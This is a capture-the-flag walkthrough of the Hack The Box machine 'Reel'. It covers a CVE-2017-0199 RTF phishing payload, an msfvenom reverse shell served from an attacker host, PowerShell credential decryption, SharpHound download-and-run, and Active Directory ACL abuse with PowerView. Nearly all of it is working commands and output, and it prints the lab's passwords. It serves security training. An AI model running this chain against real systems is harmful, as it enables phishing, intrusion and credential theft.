Nmap scan:

```bash
PORT      STATE SERVICE    VERSION
21/tcp    open  tcpwrapped
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-28-18  11:19PM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  tcpwrapped
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  tcpwrapped
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
135/tcp   open  tcpwrapped
139/tcp   open  tcpwrapped
445/tcp   open  tcpwrapped Windows Server 2012 R2 Standard 9600 tcpwrapped
593/tcp   open  tcpwrapped
49159/tcp open  tcpwrapped

Host script results:
|_clock-skew: mean: 1s, deviation: 2s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2020-12-13T14:50:26+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-12-13T14:50:23
|_  start_date: 2020-12-13T14:35:58
```

### Enumerating ftp

```bash
$ ftp 10.10.10.77
Connected to 10.10.10.77.
220 Microsoft FTP Service
Name (10.10.10.77:localuser): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

Let's see the files:

```bash
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
05-28-18  11:19PM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
05-28-18  11:19PM                 2047 AppLocker.docx
05-28-18  01:01PM                  124 readme.txt
10-31-17  09:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
```

readme.txt:

```bash
$ cat readme.txt 
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

AppLocker.docx:

```
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```

Windows Event Forwarding.docx, using exiftool there's a mail:

```bash
$ exiftool 'Windows Event Forwarding.docx'
----
----
Creator                         : nico@megabank.com
----
----
```

### Test if the email finded exists with SNMP

```bash
$ telnet 10.10.10.77 25
Trying 10.10.10.77...
Connected to 10.10.10.77.
Escape character is '^]'.
220 Mail Service ready
HELO user.htb
250 Hello.
MAIL FROM: <user@useruser.com>
250 OK
RCPT TO: <nico@megabank.com>
250 OK
RCPT TO: <asdasd@megabank.com>
550 Unknown user
```

It exists as it returned `250 OK`, now this seems like we have to send a rtf file to nico@megabank.com, searching for an exploit for this there's the CVE-2017-0199.

### Exploiting CVE-2017-0199 to get a reverse shell
 
First I'll clone this repository: https://github.com/bhdresh/CVE-2017-0199, then i'll generate the malicious rtf file using this command.

```
$ python2 cve-2017-0199_toolkit.py -M gen -w thefile.rtf -u http://10.10.14.17/rev.hta -t RTF -x 0
```

Then create the file that will give a reverse shell

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=9001 -f hta-psh -o rev.hta
```

The next thing is to send the email, I'll use `sendemail`, I'll set up a server hosting the two files with python:

```bash
$ sudo python3 -m http.server 80
```

Then the nc listener:

```bash
$ nc -lvnp 9001
```

And finally send the email, I'll use `sendemail`:

```
$ sendemail -f user@megabank.com -u "File" -m "the file is here" -a thefile.rtf -t nico@megabank.com -s 10.10.10.77 
```

And we have a shell back, going to c:\\Users\\nico\\Desktop there's a `cred.xml` file.

### Decrypting the credential of the user Tom found in the desktop

```
c:\Users\nico\Desktop>type cred.xml
type cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

We can easily decrypt this using powershell:

```
c:\Users\nico\Desktop>powershell -c "$c = Import-CliXml -Path cred.xml; $c.GetNetworkCredential() | fl"
powershell -c "$c = Import-CliXml -Path cred.xml; $c.GetNetworkCredential() | fl"


UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

Now we can login with ssh as tom:

```bash
$ ssh tom@10.10.10.77
```

### Using Bloodhound to privesc

In tom desktop there's a directory called `AD Audit` with a directory called `BloodHound` and a `note.txt`:

```
Findings:                                                                                                                       

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                  

Maybe we should re-run Cypher query against other groups we've created.
```

`\BloodHound`:

```
05/29/2018  07:57 PM    <DIR>          Ingestors
10/30/2017  10:15 PM           769,587 PowerView.ps1                          
```

```
powershell "IEX(New-Object System.Net.Webclient).DownloadFile('http://10.10.14.17/SharpHound.ps1','SharpHound.ps1')"
powershell -exec bypass
import-module ./sharphound.ps1
Invoke-Bloodhound
```

I'll transfer the .zip

```
$ sudo python3 /opt/impacket/examples/smbserver.py serv `pwd`
```

```
net use z: \\10.10.14.17\serv 
copy 20201214150905_BloodHound.zip z:
```

Now I'll upload the zip to bloodhound

![image1](/assets/images/htb-reel/reel1.png)

Using `WriteOwner` we can own claire, add the rigth to reset the password, change it and ssh in.

First import powerview

```
import-module ..\..\PowerView.ps1
````

Set tom the owner of claire

```
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
```

Now add the right to change the password

```
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom
```

Create the password and reset it

```
$pass = ConvertTo-SecureString -String '44Pa$$w0rd$$##!!' -AsPlainText -Force
Set-DomainUserPassword -Identity claire -AccountPassword $pass
```

Now ssh into claire

```
ssh claire@10.10.10.77
```

![image2](/assets/images/htb-reel/reel2.png)

We have `GenericWrite` over `BACKUP_ADMINS@HTB.LOCAL`, so let's add her to the group

```
net group backup_admins claire /add
```

Now I have acess to the Admnistrator directory, but I can't read the flag

```
claire@REEL c:\Users\Administrator\Desktop>dir                                                                                  
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CC8A-33E1                                                                                              

 Directory of c:\Users\Administrator\Desktop                                                                                    

01/21/2018  02:56 PM    <DIR>          .                                                                                        
01/21/2018  02:56 PM    <DIR>          ..                                                                                       
11/02/2017  09:47 PM    <DIR>          Backup Scripts                                                                           
10/28/2017  11:56 AM                32 root.txt                                                                                 
               1 File(s)             32 bytes                                                                                   
               3 Dir(s)  15,767,867,392 bytes free
```

In `Backup Script` there's a file that if we read it we find  a password:

```
type BackupScript.ps1                                                  
# admin password                                                                                                                 
$password="Cr4ckMeIfYouC4n!"
```

ssh to the administrator account

```
ssh administrator@10.10.10.77
```
